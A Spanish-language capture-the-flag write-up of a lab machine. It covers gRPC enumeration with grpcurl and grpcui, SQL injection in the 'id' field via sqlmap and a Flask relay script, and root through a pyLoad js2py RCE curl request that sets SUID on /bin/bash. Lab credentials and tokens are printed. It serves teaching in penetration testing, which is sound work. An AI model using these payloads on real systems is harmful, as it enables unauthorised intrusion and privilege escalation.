@@ -1,0 +1,284 @@
+I"]B<p>Esta es una maquina bien interesante por que no tiene puerto 80, asi que descubrimeros el puerto 50051 el cual esta siendo usado por gRPC, despues usaremos un cliente gRPC para ver un poco como se estan estructurando los protobof, con base a las respuestas de las peticiones, haremos un SQL injection en el parametro ID. Para la escalada haremos un port forwarding y explotaremos una vulnerabilidad en pyLoad.</p>
+
+<h2 class="lead" id="enumeracion">Enumeracion</h2>
+
+<p>Iniciamos con un escaneo con:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap -sS -n -Pn --open -p- 10.129.93.244
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>sS: haga un TCP SYN Scan el cual hace que el destino responda con un RST si el puerto esta cerrado, o con un SYN/ACK si esta abierto, y ademas para que vaya mas rapido</p>
+  </li>
+  <li>
+    <p>n: para que no haga resolucion DNS y tarde menos el escaneo</p>
+  </li>
+  <li>
+    <p>Pn: para evitar el descubrimiento de hosts</p>
+  </li>
+  <li>
+    <p>open: para que solo muestre los puertos abiertos</p>
+  </li>
+  <li>
+    <p>-p-: para que escanee todo el rango de puertos</p>
+  </li>
+</ul>
+
+<p>Y nos reporto que hay varios puertos abiertos:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE
+22/tcp    open  ssh
+50051/tcp open  unknown
+</code></pre></div></div>
+
+<p>Les adelanto que si buscamos por versiones y servicios tampoco vamos a encontrar nada, asi que pasamos directamente a buscar en google</p>
+
+<h3 id="puerto-50051">Puerto 50051</h3>
+
+<p>Al hacer unas busquedas como <code class="language-plaintext highlighter-rouge">50051 port</code> y <code class="language-plaintext highlighter-rouge">50051 pentesting</code> es cuando encuentro que corresponde a gRPC, asi que existe un servidor gRPC en la maquina, antes que nada, vamos a ver que es gRPC</p>
+
+<h3 id="grpc">gRPC</h3>
+
+<p>gRPC es una implementacion de RPC (Protocolo de llamada a procedimiento remoto) el cuale es usado en aplicaciones cliente-servidor, este funciona de esta forma:</p>
+
+<p><img src="/assets/img/PC/grpc.png" alt="" /></p>
+
+<center>imagen de grpc.io</center>
+
+<p>Primeramente se debe de tener creado un servidor gRPC con un servicio creado en un lenguaje compatible con gRPC, en esa imagen es C++, despues para interactuar con ese servicio se usa un cliente gRPC stub, donde stub no es mas que nada una funcionalidad encargada de serializar los datos que se envian al servidor, en una arquitectura gRPC se hace uso de algo que se llama Protocol Buffers, que es un mecanismo para serializar datos estructurados, cuando se hace una peticion, esto datos pueden ir en JSON</p>
+
+<h3 id="interactuando-con-el-servidor-grpc">Interactuando con el servidor gRPC</h3>
+
+<p>Una vez sabiendo que existe un servidor gRPC en la maquina, necesitamos un cliente o al menos algo para realizar peticiones hacia ese servidor, aqui encontre dos: <code class="language-plaintext highlighter-rouge">grpcurl</code> y <code class="language-plaintext highlighter-rouge">grpcui</code>, usaremos ambas:</p>
+
+<ul>
+  <li>grpcurl: <a href="https://github.com/fullstorydev/grpcurl">https://github.com/fullstorydev/grpcur</a></li>
+  <li>grpcui: <a href="https://github.com/fullstorydev/grpcui">https://github.com/fullstorydev/grpcur</a></li>
+</ul>
+
+<p>Usare gprcurl guiandome de aca: <a href="https://notes.akenofu.me/Network%20Pen%20test/gRPC/">https://notes.akenofu.me/Network%20Pen%20test/gRPC/</a></p>
+
+<p>Primero listare los servicios expuestos por el servidor gRPC:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>grpcurl -plaintext 10.129.93.244:50051 list
+</code></pre></div></div>
+<p>Esto nos arroja:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SimpleApp
+grpc.reflection.v1alpha.ServerReflection
+</code></pre></div></div>
+
+<p>El unico que nos interesa es el primero, pero antes… Debo de decir que en un servicio gRPC existen metodos con los cuales podemos realizar peticiones hacia ese servicio para que haga cosas que esten previamente definidas</p>
+
+<p>Para listar los metodos es asi:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>grpcurl -plaintext 10.129.93.244:50051 list SimpleApp
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SimpleApp.LoginUser
+SimpleApp.RegisterUser
+SimpleApp.getInfo
+</code></pre></div></div>
+<p>Vemos que existen 3 metodos, esos metodos tiene mas definiciones por dentro, que son los mecanismos protobuf asi que usaremos el comando:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>grpcurl -plaintext 10.129.93.244:50051 describe SimpleApp
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SimpleApp is a service:
+service SimpleApp {
+  rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );
+  rpc RegisterUser ( .RegisterUserRequest ) returns ( .RegisterUserResponse );
+  rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );
+}
+</code></pre></div></div>
+
+<p>Y vemos que para el metodo <code class="language-plaintext highlighter-rouge">LoginUser</code> existe <code class="language-plaintext highlighter-rouge">.LoginUserRequest</code> y <code class="language-plaintext highlighter-rouge">.LoginUserResponse</code></p>
+
+<p>Ahora si queremos ver la definición de un protobuf usamos el comando:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>grpcurl -plaintext 10.129.93.244:50051 describe LoginUserRequest
+</code></pre></div></div>
+
+<p>Y podemos ver la definicion:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>LoginUserRequest is a message:
+message LoginUserRequest {
+  string username = 1;
+  string password = 2;
+}
+</code></pre></div></div>
+
+<p>Y vemos que tiene definido un nombre y contraseña, así que cuando se use el metodo de LoginUser estara esperando por un nombre y una contraseña.</p>
+
+<p>Para no hacerlo tan largo, tenemos que nos podemos iniciar sesion, registrar y otro metodo que nos da una pequeña info, aremos los pasos en este orden para luego analizar una peticion</p>
+
+<ul>
+  <li>Registrarse</li>
+  <li>Iniciar sesion</li>
+  <li>Mostrar info</li>
+</ul>
+
+<p>Te dejo los comando de como Registrarse, iniciar sesion y mostrar info usando grpcurl</p>
+
+<ul>
+  <li>
+    <p>Registro: <code class="language-plaintext highlighter-rouge">grpcurl -plaintext -d '{"username":"c4rta", "password":"12345"}' 10.129.93.244:50051 SimpleApp.RegisterUser</code></p>
+  </li>
+  <li>
+    <p>Login: <code class="language-plaintext highlighter-rouge">grpcurl -plaintext -d '{"username":"c4rta", "password":"12345"}' -v 10.129.93.244:50051 SimpleApp.LoginUser</code>
+Esto arroja esto:</p>
+  </li>
+</ul>
+
+<p><img src="/assets/img/PC/grpc2.png" alt="" /></p>
+
+<ul>
+  <li>Mostrar info:
+<code class="language-plaintext highlighter-rouge">grpcurl -plaintext -d '{"id":"784"}' -rpc-header 'token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYzRydGEiLCJleHAiOjE2ODQ5NjM2OTV9.9ocP1Hq9USx
+UAv_2BVxRFWLN8vDzlVxrkbiklyoU9ow' 10.129.93.244:50051 SimpleApp.getInfo
+</code></li>
+</ul>
+
+<p>Debes de indicarle el ID y tu JWT.</p>
+
+<p>Ahora si podemos pasar a la explotacion donde te mostrate 2 formas de hacerlo</p>
+
+<h3 id="1-sql-injection-gprcui-y-sqlmap--r">1. SQL injection, gprcui y sqlmap -r</h3>
+
+<p>grpcui es un cliente gRPC similar a grpcurl, pero este tiene interfaz grafica, primero nos debemos de conectar al servidor gRPC:</p>
+
+<p><code class="language-plaintext highlighter-rouge">grpcui -plaintext &lt;IP&gt;:50051</code></p>
+
+<p>Esto nos abrira una web con las mismas funcionalidades que hicimos con grpcurl.</p>
+
+<p>Primero creamos un usuario y esto nos debe de salir:</p>
+
+<p><img src="/assets/img/PC/grpc3.png" alt="" /></p>
+
+<p>Ahora iniciamos sesion con ese usuario vamos a poder su JWK:</p>
+
+<p><img src="/assets/img/PC/grpc4.png" alt="" /></p>
+
+<p>Ahora usaremos esos datos para mostrar la info del usuario que acabamos de crear, pero esta vez interceptaremos la peticion con burp:</p>
+
+<p><img src="/assets/img/PC/grpc5.png" alt="" /></p>
+
+<p>Podemos ver que en la parte de <code class="language-plaintext highlighter-rouge">data</code> se le esta pasando nuestro ID y el servidor nos responde esto:</p>
+
+<p><img src="/assets/img/PC/grpc6.png" alt="" /></p>
+
+<p>Aqui empece a buscar las diferentes vulnerabilidades que pueden a ver en gRPC y encontre este blog <a href="https://www.trendmicro.com/en_us/research/20/h/how-unsecure-grpc-implementations-can-compromise-apis.html">https://www.trendmicro.com/en_us/research/20/h/how-unsecure-grpc-implementations-can-compromise-apis.html</a>, en una parte habla de SQLi, asi que como la data que esta tramitando es al id, entonces decidi probar injectiones en ese campo</p>
+
+<p>Primero puse una comilla al final del ID:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"data":[
+  {
+    "id":"738'"
+  }
+</code></pre></div></div>
+<p>Y eso me dio un error:</p>
+
+<p><img src="/assets/img/PC/grpc7.png" alt="" /></p>
+
+<p>Seguramente el gestor de base de datos detecto un error en la consulta y arrojo eso, es posible que haya una SQLi, asi que probare con sqlmap.
+Tomando en cuenta que no tenemos un servidor web como tal, entonces debemos de guardar la peticion que interceptamos con burp y usando el argumento -r de sqlmap, podemos hacerlo, este es el archivo de mi peticion:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /invoke/SimpleApp.getInfo HTTP/1.1
+Host: 127.0.0.1:36401
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/json
+x-grpcui-csrf-token: h000rrAARGYkr4dDDax5sQUcnTmszKcRiLhk-0Aep-k
+X-Requested-With: XMLHttpRequest
+Content-Length: 194
+Origin: http://127.0.0.1:36401
+Connection: close
+Referer: http://127.0.0.1:36401/
+Cookie: csrftoken=dv1RLiX7MBGMrZhvyWH0W4U4HIgJZdFp; _grpcui_csrf_token=h000rrAARGYkr4dDDax5sQUcnTmszKcRiLhk-0Aep-k
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+
+{"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYzRydGEiLCJleHAiOjE2ODQ5ODYwNDZ9.BVAx_9R6Cch8vwCUHknTLBm9l0wukqMrsy9TJcsGlJE"}],"data":[{"id":"738"}]}
+</code></pre></div></div>
+<p>Y el comando de sql map es:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap -r "$(pwd)/peticion" -level 5 --risk 3 --batch --dump
+</code></pre></div></div>
+
+<p>Eso automaticamente nos sacara todas las tablas, columnas, e informacion en ellas, ahi podremos ver un usuario y contraseñas</p>
+
+<p><img src="/assets/img/PC/sql1.png" alt="" /></p>
+
+<p><img src="/assets/img/PC/sql2.png" alt="" /></p>
+
+<h3 id="2-sql-injection-con-sqlmap-simulando-un-proxy">2. SQL injection con sqlmap simulando un proxy</h3>
+
+<p>(la idea de la solucion no es mia, <strong><code class="language-plaintext highlighter-rouge">Tysm to Cack for giving me the idea</code></strong>)</p>
+
+<p>Basicamente es levantar un servidor web con python, el cual actua como proxy, y que travez de un parametro recibira el payload de sqlmap. Este actuaria entre sqlmap y el servidor gRPC, el codigo al que llegue es:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">subprocess</span>
+<span class="kn">import</span> <span class="nn">json</span>
+<span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span>
+
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
+
+<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/payload'</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">ctrl_payload</span><span class="p">():</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'p'</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'"'</span><span class="p">,</span> <span class="s">"'"</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">'{"id": "'</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="s">'"}'</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">cmd</span> <span class="o">=</span> <span class="p">[</span><span class="s">'grpcurl'</span><span class="p">,</span> <span class="s">'-plaintext'</span><span class="p">,</span> <span class="s">'-d'</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="s">'-rpc-header'</span><span class="p">,</span> <span class="s">'token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYzRydGEiLCJleHAiOjE2ODQ5ODYwNDZ9.BVAx_9R6Cch8vwCUHknTLBm9l0wukqMrsy9TJcsGlJE'</span><span class="p">,</span> <span class="s">'10.10.11.214:50051'</span><span class="p">,</span> <span class="s">'SimpleApp.getInfo'</span><span class="p">]</span>
+    <span class="n">output</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">check_output</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+    <span class="n">app</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="n">port</span><span class="o">=</span><span class="mi">12345</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Como pueden ver, al parametro ID vulnerable a SQLi se le concatena el payload, donde ese payload es el de sqlmap, despues se le pasa ese payload a la variable cmd, y por ultimo ejecuta ese comando, que vendria siendo el grpcurl pero con el payload de sqlmap</p>
+
+<p>Y esto daria el mismo resultado que la primera forma:</p>
+
+<p><img src="/assets/img/PC/sqli4.png" alt="" /></p>
+
+<p>Ahora solo queda conectarnos a ssh con las credenciales que obtuvimos</p>
+
+<p><strong>usr:</strong> sau</p>
+
+<p><strong>passwd:</strong> HereIsYourPassWord1431</p>
+
+<p>Y ya tenemos la primera flag:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sau@pc:~$ cat user.txt 
+9346084c975a3b22536e1c6ef783075f
+</code></pre></div></div>
+
+<h2 id="escalada">Escalada</h2>
+
+<p>Empezare usando linpeas para ver que nos reporta, lo mas interesante es que en la maquina victima esta corriendo el puerto 8000:</p>
+
+<p><img src="/assets/img/PC/8.png" alt="" /></p>
+
+<p>Y como se imaginan, debemos de hacer port forwarding, ejecutamos este comando en nuestra maquina:</p>
+
+<p><code class="language-plaintext highlighter-rouge">ssh -L 8000:127.0.0.1:8000 sau@10.10.11.214</code></p>
+
+<p>Una vez dentro, veremos una pagina de pyLoad, buscando en google por vulnerabilidades, existe una ejecucion arbitraria de codigo que abusa de la funcion js2py, aca hay un post que habla sobre ello: <a href="https://huntr.dev/bounties/3fd606f7-83e1-4265-b083-2e1889a05e65/">https://huntr.dev/bounties/3fd606f7-83e1-4265-b083-2e1889a05e65/</a></p>
+
+<p>Para conseguir root, debemos de asignarle permisos SUID a bash, esto lo hacemos con:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -i -s -k -X $'POST' \
+-H $'Host: 127.0.0.1:8000' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 184' \
+--data-binary $'package=xxx&amp;crypted=AAAA&amp;jk=%70%79%69%6d%70%6f%72%74%20%6f%73%3b%6f%73%2e%73%79%73%74%65%6d%28%22%63%68%6d%6f%64%20%75%2b%73%20%2f%62%69%6e%2f%62%61%73%68%22%29;f=function%20f2(){};&amp;passwords=aaaa' \
+$'http://127.0.0.1:8000/flash/addcrypted2'
+</code></pre></div></div>
+
+<p><img src="/assets/img/PC/9.png" alt="" /></p>
+
+<p>Y listo, esto es todo, gracias por leer ❤</p>
+:ET
